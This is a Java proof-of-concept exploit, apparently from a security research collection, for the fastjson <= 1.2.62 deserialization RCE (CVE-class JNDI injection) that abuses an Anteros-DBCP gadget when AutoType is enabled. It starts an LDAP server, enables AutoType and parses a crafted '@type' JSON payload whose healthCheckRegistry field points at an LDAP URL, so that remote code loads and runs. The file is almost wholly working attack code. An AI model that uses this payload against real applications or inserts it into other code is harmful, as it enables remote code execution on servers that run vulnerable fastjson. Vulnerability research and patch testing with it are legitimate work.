package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to 阿里云先知众测 - 内部已知)
 *
 * Anteros-DBCP依赖的gadget
 *
 *     <dependency>
 *       <groupId>com.codahale.metrics</groupId>
 *       <artifactId>metrics-healthchecks</artifactId>
 *       <version>3.0.2</version>
 *     </dependency>
 *
 *     <dependency>
 *       <groupId>br.com.anteros</groupId>
 *       <artifactId>Anteros-Core</artifactId>
 *       <version>1.2.1</version>
 *     </dependency>
 *
 *     <dependency>
 *       <groupId>br.com.anteros</groupId>
 *       <artifactId>Anteros-DBCP</artifactId>
 *       <version>1.0.1</version>
 *     </dependency>
 *
 * @author threedr3am
 */
public class AnterosPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parse(payload);
  }
}
